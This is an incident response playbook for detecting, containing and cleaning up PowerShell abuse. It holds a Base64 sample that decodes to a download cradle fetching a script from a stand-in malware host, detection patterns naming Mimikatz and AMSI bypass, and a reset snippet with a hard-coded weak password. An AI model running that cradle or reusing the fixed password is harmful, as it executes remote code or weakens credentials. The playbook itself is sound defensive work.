# Incident Response Playbook: PowerShell Abuse

## 📋 Playbook Information

| Field | Value |
|-------|-------|
| **Playbook ID** | IR-PB-003 |
| **Version** | 1.0 |
| **Last Updated** | 2026-01-28 |
| **MITRE ATT&CK** | T1059.001 - Command and Scripting Interpreter: PowerShell |
| **Severity** | HIGH-CRITICAL (P1-P2) |
| **MTTR Target** | 30 minutes |

## 🚨 Incident Overview

### Description
PowerShell abuse involves adversaries using PowerShell commands and scripts for execution of malicious code. Attackers leverage PowerShell's powerful capabilities for downloading payloads, executing encoded commands, and living-off-the-land techniques.

### Detection Rules
- **Rule 200010**: PowerShell encoded command detected (HIGH)
- **Rule 200011**: PowerShell download cradle detected (HIGH)
- **Rule 200012**: PowerShell execution policy bypass (MEDIUM)
- **Rule 200013**: Mimikatz detected in PowerShell (CRITICAL)
- **Rule 200014**: PowerShell Invoke-Expression detected (MEDIUM)

### Attack Techniques
| Technique | Description | Severity |
|-----------|-------------|----------|
| **Encoded Commands** | Base64 encoded payloads to evade detection | HIGH |
| **Download Cradles** | Remote script execution (IEX, WebClient) | HIGH |
| **AMSI Bypass** | Anti-Malware Scan Interface bypass | CRITICAL |
| **Mimikatz** | Credential harvesting | CRITICAL |
| **Fileless Malware** | In-memory execution | CRITICAL |

---

## ⚡ PHASE 1: TRIAGE (5 minutes)

### Initial Assessment

**Determine Attack Type:**

```powershell
# Check alert details - What triggered?
# Encoded command? → Decode and analyze
# Download cradle? → Identify URL and payload
# Mimikatz? → IMMEDIATELY ESCALATE TO P1
```

### Severity Determination

| Indicator | Severity | Action |
|-----------|----------|--------|
| Mimikatz keywords detected | **P1 CRITICAL** | Immediate isolation |
| Encoded command with download | **P1 CRITICAL** | Immediate isolation |
| AMSI bypass detected | **P1 CRITICAL** | Immediate isolation |
| Download from external URL | **P2 HIGH** | Urgent investigation |
| Execution policy bypass | **P3 MEDIUM** | Standard investigation |
| Generic encoded command | **P3 MEDIUM** | Standard investigation |

### Immediate Questions

1. ☐ What was the encoded/executed command?
2. ☐ Which user executed the PowerShell command?
3. ☐ Was there network activity (downloads)?
4. ☐ Is the user account privileged (admin)?
5. ☐ Are there signs of credential theft (Mimikatz)?
6. ☐ Is this an expected administrative activity?

---

## 🔍 PHASE 2: INVESTIGATION (15 minutes)

### Decode Encoded Commands

```powershell
# Decode Base64 encoded command
$encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbQBhAGwAdwBhAHIAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACIAKQA="
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
Write-Output $decoded

# Common patterns to look for:
# - IEX (Invoke-Expression)
# - DownloadString
# - WebClient
# - Invoke-Mimikatz
# - AMSI bypass patterns
```

### Collect Evidence

```powershell
# Create evidence directory
$IncidentId = "INC-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$EvidencePath = "C:\Evidence\$IncidentId"
New-Item -Path $EvidencePath -ItemType Directory

# Get PowerShell event logs
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    StartTime=(Get-Date).AddHours(-4)
} | Export-Csv "$EvidencePath\powershell-logs.csv"

# Get script block logging (Event ID 4104)
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    ID=4104
} -MaxEvents 100 | ForEach-Object {
    $_ | Select-Object TimeCreated, @{
        Name='ScriptBlock'
        Expression={$_.Properties[2].Value}
    }
} | Export-Csv "$EvidencePath\script-blocks.csv"

# Get process creation events
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4688
    StartTime=(Get-Date).AddHours(-4)
} | Where-Object {$_.Message -like "*powershell*"} |
  Export-Csv "$EvidencePath\powershell-processes.csv"

# Check for suspicious modules loaded
Get-Process -Name powershell* | ForEach-Object {
    Get-Process -Id $_.Id -Module -ErrorAction SilentlyContinue
} | Export-Csv "$EvidencePath\loaded-modules.csv"

# Get network connections for PowerShell
Get-NetTCPConnection | Where-Object {
    $_.OwningProcess -in (Get-Process -Name powershell* -ErrorAction SilentlyContinue).Id
} | Export-Csv "$EvidencePath\network-connections.csv"
```

### Analyze for Indicators

```powershell
# Search for common malicious patterns
$maliciousPatterns = @(
    "IEX",
    "Invoke-Expression",
    "DownloadString",
    "DownloadFile",
    "WebClient",
    "Invoke-Mimikatz",
    "sekurlsa",
    "AMSI",
    "bypass",
    "-enc",
    "-encodedcommand",
    "FromBase64String",
    "Invoke-Command",
    "Enter-PSSession",
    "powershell.exe -nop",
    "hidden",
    "-w hidden"
)

# Check script blocks for malicious patterns
$scriptBlocks = Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    ID=4104
} -MaxEvents 500

foreach ($event in $scriptBlocks) {
    $script = $event.Properties[2].Value
    foreach ($pattern in $maliciousPatterns) {
        if ($script -match $pattern) {
            Write-Warning "Pattern '$pattern' found at $($event.TimeCreated)"
            $event | Export-Csv "$EvidencePath\malicious-matches.csv" -Append
        }
    }
}
```

### Check for Lateral Movement

```powershell
# Check for PSRemoting activity
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-WinRM/Operational'
    StartTime=(Get-Date).AddHours(-4)
} | Export-Csv "$EvidencePath\winrm-logs.csv"

# Check for remote PowerShell sessions
Get-PSSession | Export-Csv "$EvidencePath\ps-sessions.csv"

# Check scheduled tasks for PowerShell
Get-ScheduledTask | Where-Object {
    $_.Actions.Execute -like "*powershell*"
} | Export-Csv "$EvidencePath\scheduled-ps-tasks.csv"
```

---

## 🛡️ PHASE 3: CONTAINMENT (10 minutes)

### Immediate Containment

#### 1. Kill Malicious PowerShell Processes
```powershell
# Kill all PowerShell processes (use with caution)
Get-Process -Name powershell*, pwsh* | Stop-Process -Force

# Kill specific PID
Stop-Process -Id <PID> -Force
```

#### 2. Block Malicious URLs
```powershell
# Add to hosts file for immediate block
$maliciousUrls = @(
    "malware.com",
    "evil.net"
)

foreach ($url in $maliciousUrls) {
    Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "0.0.0.0 $url"
}

# Or block at Windows Firewall
New-NetFirewallRule -DisplayName "Block Malicious URL" -Direction Outbound -RemoteAddress <IP> -Action Block
```

#### 3. Disable User Account
```powershell
# Disable compromised account
Disable-LocalUser -Name "<username>"

# For domain account
Disable-ADAccount -Identity "<username>"
```

#### 4. Isolate System
```powershell
# Disable network adapters (last resort)
Get-NetAdapter | Disable-NetAdapter -Confirm:$false

# Or update firewall to block all
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
Get-NetFirewallRule | Set-NetFirewallRule -Enabled False
New-NetFirewallRule -DisplayName "Block All" -Direction Outbound -Action Block
```

### Short-Term Containment

#### Restrict PowerShell
```powershell
# Enable Constrained Language Mode
[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')

# Set restrictive execution policy
Set-ExecutionPolicy Restricted -Scope LocalMachine -Force

# Block PowerShell downloads
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell" -Name "EnableScripts" -Value 0

# Enable script block logging
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
```

### Long-Term Containment

#### Deploy AppLocker/WDAC Rules
```powershell
# Create AppLocker rule to block unsigned PowerShell scripts
# This requires AppLocker to be configured

# Enable WDAC (Windows Defender Application Control)
# Deploy via Group Policy in enterprise environments
```

---

## 🧹 PHASE 4: ERADICATION (20 minutes)

### Remove Malware/Payloads

```powershell
# Search for downloaded files
Get-ChildItem -Path C:\Users -Recurse -Include *.ps1,*.exe,*.dll |
  Where-Object {$_.CreationTime -gt (Get-Date).AddHours(-24)} |
  Export-Csv "$EvidencePath\recent-files.csv"

# Check common drop locations
$dropLocations = @(
    "$env:TEMP",
    "$env:USERPROFILE\Downloads",
    "C:\ProgramData",
    "C:\Windows\Temp"
)

foreach ($location in $dropLocations) {
    Get-ChildItem -Path $location -Recurse -File |
      Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)} |
      Select-Object FullName, Length, LastWriteTime
}

# Remove identified malicious files
Remove-Item -Path "C:\path\to\malware.ps1" -Force
```

### Remove Persistence

```powershell
# Check and remove scheduled tasks
Get-ScheduledTask | Where-Object {
    $_.Actions.Execute -like "*powershell*" -or
    $_.Actions.Arguments -like "*-enc*"
} | Unregister-ScheduledTask -Confirm:$false

# Check registry run keys
$runKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
)

foreach ($key in $runKeys) {
    Get-ItemProperty -Path $key | 
      Where-Object {$_.PSObject.Properties.Value -like "*powershell*"}
}

# Check WMI subscriptions
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```

### Credential Rotation

```powershell
# If Mimikatz was detected, rotate all credentials
# Force password change for affected user
Set-ADAccountPassword -Identity "<user>" -Reset -NewPassword (ConvertTo-SecureString -String "NewP@ssw0rd!" -AsPlainText -Force)

# Revoke Kerberos tickets
klist purge

# If domain admin compromised, consider:
# - Resetting krbtgt password (twice, 10 hours apart)
# - Rotating all service account passwords
# - Reviewing golden ticket attack indicators
```

---

## 🔄 PHASE 5: RECOVERY (30 minutes)

### System Validation

```powershell
# Run Windows Defender full scan
Start-MpScan -ScanType FullScan

# Check system integrity
sfc /scannow
DISM /Online /Cleanup-Image /RestoreHealth

# Verify no malicious processes
Get-Process | Where-Object {
    $_.Path -notlike "C:\Windows\*" -and
    $_.Path -notlike "C:\Program Files*"
}

# Check PowerShell profile for backdoors
$profiles = @(
    $PROFILE.AllUsersAllHosts,
    $PROFILE.AllUsersCurrentHost,
    $PROFILE.CurrentUserAllHosts,
    $PROFILE.CurrentUserCurrentHost
)
foreach ($profile in $profiles) {
    if (Test-Path $profile) {
        Write-Warning "Profile exists: $profile"
        Get-Content $profile
    }
}
```

### Re-enable Security Controls

```powershell
# Re-enable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false

# Re-enable AMSI
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\AMSI" -Name "AmsiEnable" -ErrorAction SilentlyContinue

# Re-enable script block logging (verify)
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
```

### Enhanced Monitoring

```powershell
# Enable enhanced PowerShell logging
# Via Group Policy or Registry:
# - Module Logging
# - Script Block Logging  
# - Transcription

# Create a GPO or apply locally:
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 1

# Enable transcription
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "OutputDirectory" -Value "C:\PSTranscripts"
```

---

## 📊 PHASE 6: POST-INCIDENT ACTIVITY (1 hour)

### Document Findings

**Attack Summary:**
- What was the initial vector?
- What commands were executed?
- What was the attacker's objective?
- What data may have been accessed/exfiltrated?
- What credentials may be compromised?

### Lessons Learned

**Questions to Answer:**
1. How did the attack bypass security controls?
2. Were PowerShell logs adequate for investigation?
3. What additional monitoring is needed?
4. Should PowerShell be restricted for users?
5. Is application whitelisting needed?

### Preventive Measures

1. **Constrained Language Mode**
   - Enable for non-admin users
   - Prevents .NET, COM, and other dangerous features

2. **AppLocker/WDAC**
   - Whitelist approved PowerShell scripts
   - Block unsigned or untrusted scripts

3. **Enhanced Logging**
   - Script block logging
   - Module logging
   - Transcription

4. **AMSI Protection**
   - Ensure AMSI is enabled
   - Update Windows Defender definitions
   - Consider EDR with AMSI integration

5. **User Training**
   - Educate on phishing attacks
   - Report suspicious attachments
   - Understand PowerShell risks

---

## 📚 Quick Reference

### Decode Commands
```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("ENCODED_STRING"))
```

### Kill PowerShell
```powershell
Get-Process -Name powershell*, pwsh* | Stop-Process -Force
```

### Check Script Blocks
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';ID=4104} -MaxEvents 50
```

### Block Execution
```powershell
Set-ExecutionPolicy Restricted -Scope LocalMachine -Force
```

---

**Version**: 1.0  
**Last Updated**: 2026-01-28  
**Next Review**: 2026-02-28
